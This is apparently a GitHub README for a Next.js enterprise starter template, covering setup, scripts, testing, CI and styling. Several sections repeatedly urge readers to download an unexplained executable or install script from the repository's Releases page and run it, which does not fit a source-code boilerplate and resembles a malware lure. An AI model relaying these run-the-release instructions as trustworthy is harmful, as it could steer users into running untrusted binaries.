[![Releases](https://img.shields.io/badge/Releases-v1.0-blue?logo=github)](https://github.com/joaovbr2001/next-enterprise-main/releases)

# Enterprise Next.js Boilerplate for Scalable Production Apps
💼 A solid, production-ready Next.js starter. Includes TypeScript, Tailwind CSS, ESLint, Prettier, tests, CI setup, and sensible defaults for enterprise projects.

![Next.js logo](https://assets.vercel.com/image/upload/v1662132809/front/nextjs/twitter-card.png)

Table of contents
- [Overview](#overview)
- [Highlights](#highlights)
- [Tech stack](#tech-stack)
- [Quick start](#quick-start)
- [Release assets (download and run)](#release-assets-download-and-run)
- [Project layout](#project-layout)
- [Scripts](#scripts)
- [Configuration guide](#configuration-guide)
- [Testing strategy](#testing-strategy)
- [CI / CD](#ci--cd)
- [Styling and theming](#styling-and-theming)
- [Architecture notes](#architecture-notes)
- [Contributing](#contributing)
- [License](#license)

Overview
This repository provides a repeatable baseline for building large Next.js applications. It focuses on performance, maintainability, and developer experience. The setup enforces code style and testing, and includes common integrations used in enterprise teams.

Highlights
- Full TypeScript support and strict types.
- Tailwind CSS for utility-first styling.
- ESLint and Prettier configured and integrated with Husky pre-commit checks.
- Testing with Jest for unit tests and Playwright for end-to-end tests.
- Opinionated folder structure that scales.
- Environment management and runtime feature flags.
- Production-ready builds and Docker targets.

Tech stack
- Next.js — server-rendered React framework tuned for performance.
- TypeScript — typed JavaScript for safer code.
- Tailwind CSS — utility-first styling system.
- ESLint + Prettier — linting and formatting.
- Jest + Testing Library — unit and integration tests.
- Playwright — E2E testing across browsers.
- Vitest / ts-node — optional fast test runner for local dev.
- Docker — containerized build and runtime options.
- Vercel / Netlify / AWS — deployable targets.

Badges
[![Releases](https://img.shields.io/badge/Releases-latest-brightgreen?logo=github)](https://github.com/joaovbr2001/next-enterprise-main/releases)  
[![TypeScript](https://img.shields.io/badge/TypeScript-%23007ACC.svg?logo=typescript&logoColor=white)](https://www.typescriptlang.org/) [![Next.js](https://img.shields.io/badge/Next.js-black?logo=next.js&logoColor=white)](https://nextjs.org/) [![Tailwind CSS](https://img.shields.io/badge/Tailwind_CSS-%2338B2AC.svg?logo=tailwind-css&logoColor=white)](https://tailwindcss.com/)

Quick start
1. Clone the repo:
```bash
git clone https://github.com/joaovbr2001/next-enterprise-main.git
cd next-enterprise-main
```
2. Install dependencies:
```bash
pnpm install
# or
npm install
# or
yarn
```
3. Copy environment template and update:
```bash
cp .env.example .env.local
# open .env.local and fill values
```
4. Run the dev server:
```bash
pnpm dev
# or
npm run dev
# or
yarn dev
```
5. Open http://localhost:3000

Release assets (download and run)
Download the release artifact from the Releases page and execute the provided installer or script. The Releases page is here:
https://github.com/joaovbr2001/next-enterprise-main/releases

After you download a release asset, extract or run the file that matches your platform. The release contains compiled bundles, Docker images, or install scripts for quick bootstrap. Follow the included README in the release asset and run the executable to set up runtime artifacts.

Project layout
- /app or /pages — Next.js routing entry points.
- /components — Shared UI components.
- /lib — App utilities and API clients.
- /hooks — Reusable React hooks.
- /styles — Tailwind entry and global styles.
- /tests — Unit and integration tests.
- /e2e — Playwright test suites.
- /scripts — Dev and build helper scripts.
- /infra — Docker and deployment manifests.
- /public — Static assets and images.

Design patterns
- Presentational vs container components.
- Atomic UI components for reuse.
- Domain folders for feature boundaries.
- Single source of truth for environment variables.
- API client abstraction with typed responses.

Scripts
Run common commands with package scripts.

Development
```bash
pnpm dev
```
Build
```bash
pnpm build
```
Start production
```bash
pnpm start
```
Lint
```bash
pnpm lint
```
Format
```bash
pnpm format
```
Unit tests (Jest)
```bash
pnpm test
```
E2E tests (Playwright)
```bash
pnpm e2e
```
Docker build
```bash
docker build -t next-enterprise-app .
```

Configuration guide
TypeScript
- tsconfig targets strict mode and paths for monorepo style imports.
- Keep "noImplicitAny" enabled and add module aliases in tsconfig and next.config.js.

ESLint & Prettier
- ESLint extends Next.js and TypeScript rules.
- Prettier handles formatting and integrates with ESLint.
- Husky enforces lint-staged pre-commit to run lint and tests for staged files.

Tailwind
- Tailwind config provides a design token placeholder.
- Add components under /styles/components and include them in _app.tsx.

Environment variables
- Use .env.* with NEXT_PUBLIC_* prefix for client-safe variables.
- Keep secrets out of the repo. Use your secret manager in CI.

Testing strategy
Unit tests
- Jest with ts-jest or Vitest for fast execution.
- Use React Testing Library for component tests.
- Mock network calls and heavy dependencies.

Integration tests
- Test components with real store providers and routing context.
- Use snapshot sparingly; prefer assertions on output.

End-to-end tests
- Playwright runs headless and headed tests across Chromium, Firefox, and WebKit.
- Keep E2E tests deterministic by seeding the test database or using API fixtures.

Test commands
```bash
pnpm test:ci      # runs tests in CI mode
pnpm test:watch   # runs tests in watch mode
pnpm e2e         # runs Playwright tests
```

CI / CD
- The repo includes GitHub Actions templates for CI.
- Steps include install, lint, test, build, and publish.
- Build artifacts are cacheable. Use node cache and pnpm store.
- For deployments, a separate workflow provides Vercel deploy or Docker push to registry.

Continuous deployment tips
- Use preview deployments for PRs.
- Run integration tests against preview if possible.
- Tag releases and push build artifacts to releases or registry.

Styling and theming
- Centralize tokens: colors, spacing, and fonts.
- Use Tailwind CSS with a strict color palette to ensure brand alignment.
- Add a theme provider for runtime theme switching (light/dark).
- Keep utility classes in templates and small components. Abstract complex styles.

Accessibility
- Use semantic HTML and ARIA where needed.
- Include automated a11y checks in CI.
- Add manual testing steps for keyboard and screen reader flows.

Performance
- Image optimization with Next/Image.
- Code-splitting via dynamic imports for heavy modules.
- Use server-side rendering and incremental static regeneration where relevant.
- Add Lighthouse checks in CI to catch regressions.

Security
- Run dependency scans in CI.
- Enforce strong headers in production.
- Limit runtime secrets to environment variables and secret stores.

Architecture notes
- Prefer small, focused components.
- Keep cross-cutting concerns in well-defined libraries.
- Use feature flags to roll out major changes.
- Design APIs with clear contracts and typed DTOs.

Common integration points
- API proxy layer for server-only secrets.
- Authentication using JWT, OAuth, or provider-specific libraries.
- Analytics hooks that respect privacy and opt-outs.
- Error tracking with Sentry or similar.

Contributing
- Fork and open a pull request.
- Run the lint and test scripts before submitting.
- Follow the commit message convention configured in the repo.
- Keep PRs focused and include a short changelog entry if appropriate.

Code of conduct
- Treat others with respect.
- Keep discussions factual and civil.

Releases and assets
The Releases page provides packaged builds and installers for the project. Download the release asset and run the executable included in the release bundle to install runtime artifacts or deploy prebuilt images. Visit:
https://github.com/joaovbr2001/next-enterprise-main/releases

If a release asset includes a script like install.sh or an executable binary, run it on a safe environment that matches the target platform. Follow the release notes included with each asset for specific steps.

Examples and recipes
- Authentication example: /examples/auth shows server and client flows.
- Feature flag example: /examples/flags demonstrates runtime toggles.
- Multi-tenant setup: /examples/multitenant shows database and routing patterns.

Visuals and assets
- Use the public folder for large assets and avatars.
- Optimize images and serve WebP where applicable.
- Sample screenshots live in /public/screenshots to illustrate the main layouts.

Acknowledgments
This template borrows best practices from the Next.js ecosystem and common enterprise patterns. Credit to the maintainers of Next.js, Tailwind, TypeScript, ESLint, Playwright, and other upstream tools.

License
This project uses the MIT License. See the LICENSE file for details.

Contact
Open issues on GitHub for bugs or feature requests. Create a pull request for changes.